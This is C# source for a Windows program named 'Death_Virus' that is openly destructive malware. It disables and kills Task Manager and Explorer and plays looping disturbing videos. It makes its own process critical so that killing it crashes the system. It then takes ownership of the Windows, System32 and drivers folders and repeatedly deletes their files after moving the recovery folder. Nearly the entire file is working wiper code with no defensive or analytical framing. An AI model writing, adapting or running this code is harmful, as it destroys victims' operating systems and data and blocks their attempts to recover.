using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;

namespace Death_Virus
{
    public partial class Death_Virus : Form
    {
        SoundPlayer back_snd, noise_snd;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);


        int isCritical = 1;  // we want this to be a Critical Process
        int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }


        public Death_Virus()
        {
            //Create path
            Directory.CreateDirectory(@"C:\Program Files\Temp");
            //Extract
            Extract("Death_Virus", Application.StartupPath, "Resources", "AxInterop.WMPLib.dll");
            Extract("Death_Virus", Application.StartupPath, "Resources", "Interop.WMPLib.dll");
            Extract("Death_Virus", @"C:\Program Files\Temp", "Resources", "bg.wav");
            Extract("Death_Virus", @"C:\Program Files\Temp", "Resources", "death.mp4");
            Extract("Death_Virus", @"C:\Program Files\Temp", "Resources", "static.mp4");
            Extract("Death_Virus", @"C:\Program Files\Temp", "Resources", "static_noise.wav");
            InitializeComponent();
        }

        private void Death_Virus_Load(object sender, EventArgs e)
        {
            BackColor = Color.Black;
            Cursor.Hide();
            Start_virus();
            Player1.uiMode = "none";
            Player1.Ctlenabled = false;
            Player1.enableContextMenu = false;
            Player1.fullScreen = false;
            Player1.TabStop = false;
            Player1.stretchToFit = true;
            Player1.Dock = DockStyle.Fill;
        }

        public void Start_virus()
        {
            //Disable taskmgr
            RegistryKey taskmgr = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            //Check process taskmgr
            Process[] pname = Process.GetProcessesByName("taskmgr");
            if(pname.Length == 1)
            {
                ProcessStartInfo block_task = new ProcessStartInfo();
                block_task.FileName = "cmd.exe";
                block_task.WindowStyle = ProcessWindowStyle.Hidden;
                block_task.Arguments = @"/k taskkill /f /im taskmgr.exe && exit";
                Process.Start(block_task);
            }
            //Kill explorer
            Process[] pname2 = Process.GetProcessesByName("explorer");
            if (pname2.Length == 1)
            {
                ProcessStartInfo block_exp = new ProcessStartInfo();
                block_exp.FileName = "cmd.exe";
                block_exp.WindowStyle = ProcessWindowStyle.Hidden;
                block_exp.Arguments = @"/k taskkill /f /im explorer.exe && exit";
                Process.Start(block_exp);
            }
            //Video thread
            Thread play_video = new Thread(Video_func);
            play_video.Start();
        }

        public void Video_func()
        {
            Thread.Sleep(1000);
            Thread last_video = new Thread(Video_func2);
            if(File.Exists(@"C:\Program Files\Temp\static_noise.wav") && File.Exists(@"C:\Program Files\Temp\static.mp4"))
            {
                try
                {
                    noise_snd = new SoundPlayer(@"C:\Program Files\Temp\static_noise.wav");
                    Player1.URL = @"C:\Program Files\Temp\static.mp4";
                    Player1.settings.setMode("loop", true);
                    noise_snd.PlayLooping();
                }
                catch { }
            }
            last_video.Start();
        }

        public void Video_func2()
        {
            Thread.Sleep(10000); //10 sec delay
            Thread destroy_sys = new Thread(system_destroy);
            if(File.Exists(@"C:\Program Files\Temp\bg.wav") && File.Exists(@"C:\Program Files\Temp\death.mp4"))
            {
                try
                {
                    back_snd = new SoundPlayer(@"C:\Program Files\Temp\bg.wav");
                    Player1.URL = @"C:\Program Files\Temp\death.mp4";
                    Player1.settings.setMode("loop", true);
                    back_snd.PlayLooping();
                }
                catch { }
            }
            destroy_sys.Start();

        }

        public void system_destroy()
        {
            Thread.Sleep(1000);
            //BSOD set
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            //Take rights to sys files
            string quote = "\"";
            string recovery = @"C:\Recovery";
            ProcessStartInfo kill_sys = new ProcessStartInfo();
            kill_sys.FileName = "cmd.exe";
            kill_sys.WindowStyle = ProcessWindowStyle.Hidden;
            kill_sys.Arguments = @"/k takeown /f C:\Windows && icacls C:\Windows /grant " 
            + quote + "%username%:F" + quote + @" && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant "
            + quote + "%username%:F" + quote + @" && takeown / f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant "
            + quote + "%username%:F" + quote + " && exit";
            Process.Start(kill_sys);
            //Destroy recovery and sys files
            if (Directory.Exists(recovery))
            {
                Directory.Move(recovery, @"C:\billkok");
            }
            while(File.Exists(@"C:\Windows\System32\drivers\disk.sys") || File.Exists(@"C:\Windows\System32\winload.exe"))
            {
                string[] filePaths = Directory.GetFiles(@"C:\Windows");
                foreach(string filePath in filePaths)
                {
                    try
                    {
                        File.Delete(filePath);
                    }
                    catch { }
                }
                string[] filePaths2 = Directory.GetFiles(@"C:\Windows\System32");
                foreach (string filePath2 in filePaths2)
                {
                    try
                    {
                        File.Delete(filePath2);
                    }
                    catch { }
                }
                string[] filePaths3 = Directory.GetFiles(@"C:\Windows\System32\drivers");
                foreach (string filePath3 in filePaths3)
                {
                    try
                    {
                        File.Delete(filePath3);
                    }
                    catch { }
                }
            }

        }

        private void Death_Virus_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
